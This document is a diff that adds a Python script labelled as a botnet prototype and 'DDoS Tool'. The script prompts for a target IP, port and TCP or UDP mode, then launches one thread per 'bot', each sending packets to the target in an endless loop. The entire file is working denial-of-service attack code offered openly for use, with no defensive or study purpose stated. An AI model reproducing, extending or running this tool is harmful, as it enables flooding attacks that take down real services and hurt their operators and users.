@@ -1,0 +1,96 @@
+import os
+import threading
+import socket
+
+# Function to clear the screen
+def clear_screen():
+    os.system('cls' if os.name == 'nt' else 'clear')
+
+# Function to send TCP packets to a target IP and port
+def attack(target_ip, target_port, bot_id, attack_type):
+    while True:
+        try:
+            # Create a socket based on attack type
+            if attack_type == "TCP":
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            elif attack_type == "UDP":
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            else:
+                print("\033[91mInvalid attack type. Please choose TCP or UDP.\033[0m")
+                return
+
+            # Connect to or send data to the target IP and port
+            if attack_type == "TCP":
+                s.connect((target_ip, target_port))
+                s.send(b"GET / HTTP/1.1\r\n\r\n")
+            elif attack_type == "UDP":
+                s.sendto(b"GET /", (target_ip, target_port))
+
+            # Print attack information
+            print(f"Bot {bot_id} attack sent to:", target_ip, "on port:", target_port, "using", attack_type, "attack")
+            
+            # Close the socket
+            s.close()
+        except Exception as e:
+            print("Error:", e)
+
+# Function to display the banner
+def display_banner():
+    banner = r'''
+    ______   ____     ____     ____     ____     
+   / ____/  / __ \   / __ \   / __ \   / __ \    
+  / __/    / /_/ /  / /_/ /  / / / /  / /_/ /    
+ / /___   / _, _/  / _, _/  / /_/ /  / _, _/     
+/_____/  /_/ |_|  /_/ |_|   \____/  /_/ |_| botnet prototipe by RSC  
+'''
+    print("\033[91m" + banner + "\033[0m")
+
+# Function to display menu and get user input
+def menu():
+    display_banner()
+    print("\033[91mDDoS Tool Menu:\033[0m")
+    print("\033[91m1. Launch attack\033[0m")
+    choice = input("\033[91mEnter your choice: \033[0m")
+    return choice
+
+# Function to get attack parameters from user
+def get_attack_params():
+    clear_screen()
+    target_ip = input("Enter target IP: ")
+    target_port = int(input("Enter target port: "))
+    attack_type = input("Enter attack type (TCP/UDP): ").upper()
+    return target_ip, target_port, attack_type
+
+# Function to create and start attacks
+def create_attacks(targets):
+    for target_ip, target_port, bot_id, attack_type in targets:
+        threading.Thread(target=attack, args=(target_ip, target_port, bot_id, attack_type)).start()
+
+# Main function
+def main():
+    num_bots = 0
+    has_displayed_menu = False
+
+    while True:
+        if not has_displayed_menu:
+            choice = menu()
+            has_displayed_menu = True
+
+        if choice == "1":
+            if num_bots == 0:
+                num_bots = int(input("Enter number of bots: "))
+                targets = []
+                for i in range(num_bots):
+                    target_ip, target_port, attack_type = get_attack_params()
+                    targets.append((target_ip, target_port, i+1, attack_type))
+                create_attacks(targets)
+            else:
+                print("\033[91mInvalid choice. Please try again.\033[0m")
+                num_bots = 0
+        else:
+            clear_screen()
+            has_displayed_menu = False
+
+# Start the program
+if __name__ == "__main__":
+    main()
